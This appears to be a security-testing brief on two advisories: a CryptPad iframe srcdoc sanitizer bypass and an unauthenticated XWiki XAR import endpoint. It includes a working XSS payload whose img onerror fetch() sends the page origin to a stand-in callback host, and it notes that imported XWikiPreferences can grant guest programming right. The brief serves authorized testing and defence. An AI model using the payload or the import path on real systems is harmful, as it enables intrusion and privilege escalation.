# CryptPad `srcdoc` sanitizer and XWiki XAR import boundary batch (GHSA, 2026-05-26)

**Signal:** GitHub Security Advisories published two web-app boundary issues with durable testing value: CryptPad `GHSA-g2g4-47gv-p72v` / `CVE-2026-26028`, where an HTML sanitizer allowed `iframe srcdoc` through a restricted-tag `src` check, and XWiki `GHSA-qrvh-r3f2-9h4r` / `CVE-2026-33137`, where `POST /wikis/{wikiName}` could import a XAR without authentication or authorization checks.

The operator value is the reusable pattern: validators that inspect only one attribute on a dangerous element, and import/admin endpoints where a refactor can silently drop the permission gate.

## Items in scope

| Item | Primitive | Why it matters for authorized testing |
| --- | --- | --- |
| CryptPad `GHSA-g2g4-47gv-p72v` / `CVE-2026-26028` | sanitizer bypass via `iframe srcdoc` while only `src` is validated | a benign-looking local `blob:` media source can carry attacker-controlled HTML in a different attribute |
| XWiki `GHSA-qrvh-r3f2-9h4r` / `CVE-2026-33137` | unauthenticated XAR import through REST `POST /wikis/{wikiName}` | document/package import endpoints can become content-write or privilege-boundary primitives when admin checks are removed |

## Operator value

Use this batch as a checklist for two recurring assessment classes:

1. **Attribute-confused sanitizers.** If a sanitizer labels `iframe`, `video`, or `audio` as restricted instead of forbidden, confirm whether it validates every execution-relevant attribute, not just `src`.
2. **Import endpoints as authority boundaries.** CMS/wiki package imports often write multiple documents, metadata, preferences, attachments, and history. Treat them as admin-grade actions even when the route looks like a normal REST resource.
3. **Patch-diff recon.** XWiki's fix added a `Right.ADMIN` authorization check to `WikiResourceImpl.importXAR`. That is the high-signal diff pattern to look for in other import routes: the dangerous call was already present; the missing line was the gate.
4. **Low-impact validation first.** For both issues, prove the boundary with harmless content: a callback or marker page, not credential theft, persistent malware, or destructive package changes.

## CryptPad `iframe srcdoc` sanitizer-bypass workflow

Use a private test pad or an explicitly scoped tenant. Do not target unrelated collaborative documents.

### Confirm the dangerous model

The advisory describes a sanitizer in `www/common/diffMarked.js` where `IFRAME`, `VIDEO`, and `AUDIO` were treated as restricted tags, then checked only for a local-looking `src` value such as `blob:` or `/lib/pdfjs`. The bypass is that `srcdoc` can still define rendered HTML even when `src` passes validation.

Safe validation shape:

```html
<iframe src="blob:" srcdoc="<p>cryptpad-srcdoc-proof</p><img src=x onerror=&quot;fetch('https://callback.example/cryptpad-srcdoc?o='+encodeURIComponent(location.origin))&quot;>"></iframe>
```

Keep the proof minimal:

- callback only includes origin or a random nonce;
- no cookies, tokens, pad contents, or user identifiers;
- test in a document created for the assessment.

### Variant checks

- Restricted media tags where only `src` is inspected: `iframe`, `video`, `audio`, `object`, `embed`.
- Alternate executable attributes: `srcdoc`, event handlers, `poster`, `data`, SVG-bearing attributes, and nested HTML contexts.
- Local-source allowlists that accept `blob:`, same-origin paths, or prefix checks before full URL parsing.
- Same-origin gadget reachability. The CryptPad advisory notes `jscolor.js` as a possible same-origin code gadget, but treat gadget chaining as lab-only unless the customer explicitly authorizes active XSS validation.

### Reporting heuristic

Include:

- exact editor/viewer surface where the HTML is accepted;
- sanitized output before and after render, if visible;
- which tag and attribute pair crossed the boundary;
- whether execution occurred in the pad origin, sandboxed iframe, or a separate bounce/preview origin;
- the harmless callback proof and target version.

## XWiki unauthenticated XAR import workflow

Only test an XWiki instance where package import validation is in scope. Even a benign XAR changes application content.

### Recon and endpoint triage

1. Fingerprint XWiki and the REST API base path.
2. Check whether `POST /wikis/{wikiName}` is exposed on the main wiki and any named subwikis.
3. Send a non-mutating or intentionally invalid unauthenticated request first to distinguish route reachability from import success.
4. If active validation is approved, import a minimal benign XAR that creates a clearly named marker page, then remove it with the owner after evidence capture.

Endpoint shape from the advisory:

```text
POST /wikis/{wikiName}
Content-Type: application/zip or XAR-compatible import body
```

The confirmed patch added an admin-right check equivalent to:

```text
checkAccess(Right.ADMIN, new WikiReference(wikiName))
```

So the test objective is simple: unauthenticated or low-privileged users should receive `403 Forbidden` before the import is processed.

### What to prove safely

- Authentication state: guest, low-privileged account, wiki admin, or superadmin.
- HTTP status and whether any document was created or updated.
- The author recorded on the imported marker page.
- Whether the endpoint behaves differently on subwikis.
- Version range and whether the fixed builds return `403` for guest imports.

The XWiki Jira issue states that imported pages were saved with `guest` as author and that importing `XWiki.XWikiPreferences` could grant programming right to guest. Treat that as confirmed impact context, not as a default validation step. Do not import privilege-changing preferences outside a dedicated lab or explicit exploit-validation window.

### Variant checks

- Backup/history parameters that select different import code paths.
- Main wiki versus subwiki references in `/wikis/{wikiName}`.
- Import APIs exposed through alternate REST mount points, reverse proxies, or compatibility routes.
- Package formats that include documents, preferences, attachments, scripts, or rights objects.
- Regression risk after refactors that move business logic out of controllers/resources and leave authorization behind.

## Sources

- [GitHub Advisory Database: CryptPad sanitizer bypass via `iframe srcdoc` (`GHSA-g2g4-47gv-p72v`)](https://github.com/advisories/GHSA-g2g4-47gv-p72v)
- [CryptPad project advisory: sanitizer bypass in `diffMarked.js`](https://github.com/cryptpad/cryptpad/security/advisories/GHSA-g2g4-47gv-p72v)
- [GitHub Advisory Database: XWiki unauthenticated XAR import (`GHSA-qrvh-r3f2-9h4r`)](https://github.com/advisories/GHSA-qrvh-r3f2-9h4r)
- [XWiki project advisory: unauthenticated XAR import via REST `/wikis/{wikiName}`](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-qrvh-r3f2-9h4r)
- [XWiki Jira `XWIKI-23953`: guest user can import a XAR through `/wikis/{wikiName}`](https://jira.xwiki.org/browse/XWIKI-23953)
- [XWiki patch commit `4b7b95b`: add admin authorization check to XAR import](https://github.com/xwiki/xwiki-platform/commit/4b7b95b79256374d487e9ece1dc48f527966990f)
